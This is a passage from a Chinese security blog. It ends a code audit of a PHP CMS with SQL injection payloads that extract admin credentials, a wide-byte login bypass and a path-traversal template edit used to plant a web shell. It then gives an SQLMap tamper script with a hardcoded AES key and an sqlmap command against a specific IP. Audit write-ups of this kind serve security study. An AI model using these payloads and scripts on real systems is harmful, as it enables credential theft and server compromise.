<p>这样我们就可以先闭合前一条插入，然后利用第二条插入的数据进行SQL注入。Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;,&apos;1&apos;),(&apos;&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;6&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin),&apos;1&apos;,&apos;1</span><br></pre></td></tr></table></figure>
<p>可以利用<code>phpstorm</code>调试看下代入的结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = INSERT INTO &quot;.table(&apos;comment&apos;).&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)</span><br><span class="line">  VALUES (&apos;&apos;, &apos;$id&apos;, &apos;$user_id&apos;, &apos;$type&apos;, &apos;$mood&apos;, &apos;$content&apos;, &apos;$timestamp&apos;, &apos;1&apos;,&apos;1&apos;),(&apos;&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;6&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin),&apos;1&apos;,&apos;1&apos;, &apos;$is_check&apos;)&quot;;</span><br></pre></td></tr></table></figure>
<p>从代入结果来看，用<code>1&#39;,&#39;1&#39;),</code>来闭合第一条添加的数据，并在后面拼接插入第二条数据。<code>post_id, user_id</code>对于的是评论的<code>ID值</code>和用户的<code>ID值</code>。同时我们利用<code>content</code>来保存我们注入得到的数据内容，并显示出来。</p>
<p>发送请求包，对<code>X-Forwarded-For</code>插入<code>Payload</code>。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms4.jpg" alt=""></p>
<p>并得到返回结果</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms5.jpg" alt=""></p>
<p><code>getip()</code>函数也在<code>\uploads\guest_book.php</code>中利用到。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">		VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;$online_ip&apos;, &apos;$content&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure>
<p>这里是用<code>$online_ip</code>来得到<code>getip()</code>函数的返回值。</p>
<p>同样的方法我们可以对这个点进行SQL注入。这里直接拼接前面的就行。<code>Payload</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin))#</span><br></pre></td></tr></table></figure>
<p>拼接后的SQL查询语句如下，<code>#</code>注释后面多余的字符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;INSERT INTO &quot; . table(&apos;guest_book&apos;) . &quot; (id, rid, user_id, add_time, ip, content) </span><br><span class="line">		VALUES (&apos;&apos;, &apos;$rid&apos;, &apos;$user_id&apos;, &apos;$timestamp&apos;, &apos;1&apos;,(select concat(admin_name,&apos;:&apos;,pwd) from blue_admin))#&apos;, &apos;$content&apos;)&quot;;</span><br><span class="line">$db-&gt;query($sql);</span><br></pre></td></tr></table></figure>
<p><code>burpsuite</code>发送请求包</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms6.jpg" alt=""></p>
<p>成功注入得到数据内容。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms7.jpg" alt=""></p>
<h4><span id="sql注入三宽字节注入">SQL注入三（宽字节注入）</span></h4><p>在配置文件<code>\uploads\data\config.php</code>中设置了cms的默认字符集为<code>gb2312</code>为宽字节字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;BLUE_CHARSET&apos;,&apos;gb2312&apos;);</span><br></pre></td></tr></table></figure>
<p>同时在<code>\uploads\include\common.inc.php</code>对各种参数进行了转义处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">   $_POST = deep_addslashes($_POST);</span><br><span class="line">   $_GET = deep_addslashes($_GET);</span><br><span class="line">   $_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">   $_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>\include\mysql.class.php</code>中也有<code>MySQL</code>的默认字节为<code>GBK</code>为宽字节。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function mysql($dbhost, $dbuser, $dbpw, $dbname = &apos;&apos;, $dbcharset = &apos;gbk&apos;, $connect=1)&#123;</span><br><span class="line">	$func = empty($connect) ? &apos;mysql_pconnect&apos; : &apos;mysql_connect&apos;;</span><br><span class="line">	if(!$this-&gt;linkid = @$func($dbhost, $dbuser, $dbpw, true))&#123;</span><br><span class="line">		$this-&gt;dbshow(&apos;Can not connect to Mysql!&apos;);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		if($this-&gt;dbversion() &gt; &apos;4.1&apos;)&#123;</span><br><span class="line">			mysql_query( &quot;SET NAMES gbk&quot;);</span><br><span class="line">			if($this-&gt;dbversion() &gt; &apos;5.0.1&apos;)&#123;</span><br><span class="line">				mysql_query(&quot;SET sql_mode = &apos;&apos;&quot;,$this-&gt;linkid);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if($dbname)&#123;</span><br><span class="line">		if(mysql_select_db($dbname, $this-&gt;linkid)===false)&#123;</span><br><span class="line">			$this-&gt;dbshow(&quot;Can&apos;t select MySQL database($dbname)!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根据宽字节注入的原理：CMS中编码为<code>GB2312</code>，函数执行添加的是<code>ASCII编码</code>，MYSQL默认字符集是<code>GBK</code>。</p>
<p><code>%DF&#39;</code>会被PHP当中的addslashes函数转义为<code>%DF\&#39;</code> ，“\”既URL里的<code>%5C</code>，那么也就是说，<code>%DF&#39;</code>会被转成<code>%DF%5C%27</code>网站的字符集是<code>gb2312</code>，MYSQL使用的编码是<code>GBK</code>，就会认为<code>%DF%5C%27</code>是一个宽字符。也就是<code>縗&#39;</code>。这样就可以得到单引号进行注入了。</p>
<p>分析代码，在<code>\uploads\admin\login.php</code>文件中。登录处有如下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> 		update_admin_info($admin_name);</span><br><span class="line"> 		if($remember == 1)&#123;</span><br><span class="line"> 			setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400);</span><br><span class="line"> 			setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400);</span><br><span class="line">			setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400);</span><br><span class="line"> 		&#125;</span><br><span class="line"> 	&#125;else&#123;</span><br><span class="line"> 		showmsg(&apos;您输入的用户名和密码有误&apos;);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	showmsg(&apos;欢迎您 &apos;.$admin_name.&apos; 回来，现在将转向管理中心...&apos;, &apos;index.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>跟进函数<code>check_admin()</code>，到文件<code>\uploads\admin\include\common.fun.php</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function check_admin($name, $pwd)</span><br><span class="line">&#123;</span><br><span class="line">	global $db;</span><br><span class="line">	$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;);</span><br><span class="line"> 	if($row[&apos;num&apos;] &gt; 0)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		return true;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	else</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		return false;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是可以利用万能密码进行绕过的，但是会对单引号进行转义。这个时候就能利用宽字节注入进行单引号的逃逸了。构造如下<code>Payload</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin_name=admin%df&apos; or 1=1#&amp;admin_pwd=1</span><br></pre></td></tr></table></figure>
<p>代入SQL语句拼接结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;admin%df&apos; or 1=1#&apos; and pwd = md5(&apos;1&apos;)&quot;);</span><br></pre></td></tr></table></figure>
<p>语句返回为<code>true</code>。绕过登录认证成功登录<code>admin</code>账号。</p>
<p>利用<code>PHPstorm</code>断点调试跟进。</p>
<p>进行正常的登录，<code>PHPstorm</code>进行调试。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms8.jpg" alt=""></p>
<p>进入跟进到mysql类文件里</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms9.jpg" alt=""></p>
<p>绕过判断<code>check_admin</code>函数。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms10.jpg" alt=""></p>
<p>成功登录。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms11.jpg" alt=""></p>
<h4><span id="本地文件包含">本地文件包含</span></h4><p>在目录<code>\uploads\admin\tpl_manage.php</code>文件中有可以进行模板文件编辑的功能。</p>
<p>打开目标模板文件代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;edit&apos;)&#123;</span><br><span class="line">	$file = $_GET[&apos;tpl_name&apos;];</span><br><span class="line">	if(!$handle = @fopen(BLUE_ROOT.&apos;templates/default/&apos;.$file, &apos;rb&apos;))&#123;</span><br><span class="line">		showmsg(&apos;打开目标模板文件失败&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	$tpl[&apos;content&apos;] = fread($handle, filesize(BLUE_ROOT.&apos;templates/default/&apos;.$file));</span><br><span class="line">	$tpl[&apos;content&apos;] = htmlentities($tpl[&apos;content&apos;], ENT_QUOTES, GB2312);</span><br><span class="line">	fclose($handle);</span><br><span class="line">	$tpl[&apos;name&apos;] = $file;</span><br><span class="line">	template_assign(array(&apos;current_act&apos;, &apos;tpl&apos;), array(&apos;编辑模板&apos;, $tpl));</span><br><span class="line">	$smarty-&gt;display(&apos;tpl_info.htm&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p><code>$file = $_GET[&#39;tpl_name&#39;];</code>以<code>GET</code>方式获取文件名，这里没有对文件名进行任何处理，直接代入<code>fopen</code>函数拼接打开文件。这里可以利用<code>../../../uploads/ad_js.php</code>包含到本地的文件。</p>
<p>同时在这段读取的代码下面是有一段可以编辑的代码的。编辑的代码也没有做处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == &apos;do_edit&apos;)&#123;</span><br><span class="line"> 	$tpl_name = !empty($_POST[&apos;tpl_name&apos;]) ? trim($_POST[&apos;tpl_name&apos;]) : &apos;&apos;;</span><br><span class="line"> 	$tpl_content = !empty($_POST[&apos;tpl_content&apos;]) ? deep_stripslashes($_POST[&apos;tpl_content&apos;]) : &apos;&apos;;</span><br><span class="line"> 	if(empty($tpl_name))&#123;</span><br><span class="line"> 		return false;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	$tpl = BLUE_ROOT.&apos;templates/default/&apos;.$tpl_name;</span><br><span class="line"> 	if(!$handle = @fopen($tpl, &apos;wb&apos;))&#123;</span><br><span class="line">		showmsg(&quot;打开目标模版文件 $tpl 失败&quot;);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	if(fwrite($handle, $tpl_content) === false)&#123;</span><br><span class="line"> 		showmsg(&apos;写入目标 $tpl 失败&apos;);</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	fclose($handle);</span><br><span class="line"> 	showmsg(&apos;编辑模板成功&apos;, &apos;tpl_manage.php&apos;);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>代码中的<code>$_POST[&#39;tpl_content&#39;]</code>没有做处理，可以直接修改。</p>
<p>这样我们可以利用这个直接在<code>/uploads/ad_js.php</code>插入一句话木马。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms12.jpg" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/bcms13.jpg" alt=""></p>
<h3><span id="结语">结语</span></h3><p>这是第一次看一整套CMS的源码，之前接触到的都是CTF中常见的代码片段。整套的CMS的审计难度还是挺大的，特别是像那种MVC框架的，这套代码的结构还是相对于简单，漏洞也没有太多的过滤函数需要去进行<code>ByPass</code>的。实习的暑假阶段也快结束了，这个暑假在实习公司这边学了不少关于应急响应和漏洞挖掘方面的东西，可能是因为比自己平时自学更具有实战性，可能性和未知性吧。接下来争取每周至少整理一篇代码审计方面的博客吧，一步一步的来，慢慢往上爬。</p>
]]></content>
      
        <categories>
            
            <category> 代码审计 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[SQLMap tamper编写尝试]]></title>
      <url>https://uknowsec.cn/posts/notes/SQLMap-tamper%E7%BC%96%E5%86%99%E5%B0%9D%E8%AF%95.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p>今天遇到了一个AES加密后的SQL注入。之前很少接触AES加解密的知识，因为CTF打的少的原因。</p>
<h3><span id="代码分析">代码分析</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">//解密过程</span><br><span class="line">function decode($data)&#123;</span><br><span class="line">	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">	mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">	$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">	mcrypt_generic_deinit($td);</span><br><span class="line">	mcrypt_module_close($td);</span><br><span class="line">	if(substr(trim($data),-6)!==&apos;_mozhe&apos;)&#123;</span><br><span class="line">		echo &apos;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&apos;;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		return substr(trim($data),0,strlen(trim($data))-6);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$id=decode($_GET[&apos;id&apos;]);</span><br><span class="line">$sql=&quot;select id,title,content,time from notice where id=$id&quot;;</span><br><span class="line">$info=$link-&gt;query($sql);</span><br><span class="line">$arr=$info-&gt;fetch_assoc();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>以上是SQL注入的代码，简单的分析下代码</p>
<p>Mcrypt是PHP中的一个拓展模块，类似CURL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br></pre></td></tr></table></figure>
<p>这一部分是<code>Mcrypt</code>的关键代码，类似<code>CURL</code>的一套流程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br></pre></td></tr></table></figure>
<p>以 AES, 128 CBC模式加密数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br></pre></td></tr></table></figure>
<p><code>mcrypt_generic_init</code>函数是用来初始化加密缓冲区的，这里指定了两个参数<code>key</code>和<code>iv</code></p>
<ul>
<li><p>key    调用 mcrypt_enc_get_key_size() 函数获得的密钥最大长度。 小于最大长度的数值都被视为非法参数。</p>
</li>
<li><p>iv 通常情况下，向量大小等于算法的分组大小。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br></pre></td></tr></table></figure>
<p>相当于关闭缓冲区。</p>
<p><code>mdecrypt_generic</code>函数是解密函数，与之对应的是<code>mcrypt_generic</code>即用来加密的函数。</p>
<p>这里我们可以知道传入的<code>id</code>值经过两次<code>base64</code>解密，然后经过<code>AES</code>解密。进入后面的<code>if</code>判断.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(substr(trim($data),-6)!==&apos;_mozhe&apos;)&#123;</span><br><span class="line">	echo &apos;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	return substr(trim($data),0,strlen(trim($data))-6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个<code>if</code>判断是用来分隔字符的。通过判断上面解密得到的<code>data</code>值的后六位是否为<code>_mozhe</code>。</p>
<p>若不是则302跳转，若是则分隔字符串去除<code>_mozhe</code>。即<code>1_mozhe</code>经过分隔得到<code>1</code>。</p>
<h3><span id="php加密脚本">PHP加密脚本</span></h3><p>加密脚本很简单 只需要根据解密的反过来写就可以了。</p>
<p>解密的过程流程图如下</p>
<p><code>data-&gt;base64_decode-&gt;base64_decode-&gt;AES_decode-&gt;strlen(trim($data))-6-&gt;id</code></p>
<p>加密过程的流程图如下</p>
<p><code>id-&gt;id + _mozhe-&gt;AES_encode-&gt;base64_encode-&gt;base64_encode-&gt;data</code></p>
<p>按照流程图的顺序，php加密的代码就可以得到了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function encode($data)&#123;</span><br><span class="line">	$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&apos;&apos;,MCRYPT_MODE_CBC,&apos;&apos;);</span><br><span class="line">	mcrypt_generic_init($td,&apos;ydhaqPQnexoaDuW3&apos;,&apos;2018201920202021&apos;);</span><br><span class="line">	$data = $data .&apos;_mozhe&apos;;</span><br><span class="line">	$data = mcrypt_generic($td,$data);</span><br><span class="line">	$data=base64_encode(base64_encode($data));</span><br><span class="line">	mcrypt_generic_deinit($td);</span><br><span class="line">	mcrypt_module_close($td);</span><br><span class="line">	return $data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样我们得到了加密的函数，把需要注入的SQL语句代码函数得到加密密文就可以进行注入了。</p>
<h3><span id="tamper编写">tamper编写</span></h3><p>这个注入是可以用SQLMap来跑的，这里我们可以编写一个<code>tamper</code>脚本来进行。</p>
<p>这也是我写这个笔记的目的，进行一次<code>tamper</code>脚本编写的尝试。</p>
<p>我用自己很蹩脚的<code>Python</code>编写出一个加密和解密的脚本。</p>
<p>解密脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES  </span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def decrypt(text):</span><br><span class="line">    padding = &apos;\0&apos;</span><br><span class="line">    key = &apos;ydhaqPQnexoaDuW3&apos;</span><br><span class="line">    iv = &apos;2018201920202021&apos;</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    return cipher.decrypt(base64.b64decode(base64.b64decode(text)).rstrip(padding))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	print decrypt(&apos;ZUlJOGMzSmVMMHQwZHhNN3diM056Zz09&apos;)</span><br></pre></td></tr></table></figure>
<p>加密脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Cipher import AES  </span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encrypt(text):</span><br><span class="line">    padding = &apos;\0&apos;</span><br><span class="line">    key = &apos;ydhaqPQnexoaDuW3&apos;</span><br><span class="line">    iv = &apos;2018201920202021&apos;</span><br><span class="line">    pad_it = lambda s: s+(16 - len(s)%16)*padding </span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    text = text + &apos;_mozhe&apos;</span><br><span class="line">    return base64.b64encode(base64.b64encode(cipher.encrypt(pad_it(text))))</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	print encrypt(&apos;1&apos;)</span><br></pre></td></tr></table></figure>
<p>这里我们就可以根据这个加密脚本编写tamper了。直接把函数丢进去。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &apos;LICENSE&apos; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line">from lib.core.settings import UNICODE_ENCODING</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def encrypt(text):</span><br><span class="line">    padding = &apos;\0&apos;</span><br><span class="line">    key = &apos;ydhaqPQnexoaDuW3&apos;</span><br><span class="line">    iv = &apos;2018201920202021&apos;</span><br><span class="line">    pad_it = lambda s: s+(16 - len(s)%16)*padding </span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    text = text + &apos;_mozhe&apos;</span><br><span class="line">    return base64.b64encode(base64.b64encode(cipher.encrypt(pad_it(text))))</span><br><span class="line">	</span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    </span><br><span class="line">    return encrypt(payload)</span><br></pre></td></tr></table></figure>
<p>启动SQLMap,就可以直接的进行注入了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://219.153.49.228:42530/news/list.php?id=&quot; --tamper aes.py --current-user --current-db --is-dba</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.2.4#stable&#125;</span><br><span class="line">|_ -| . [,]     | .&apos;| . |</span><br><span class="line">|___|_  [&quot;]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span 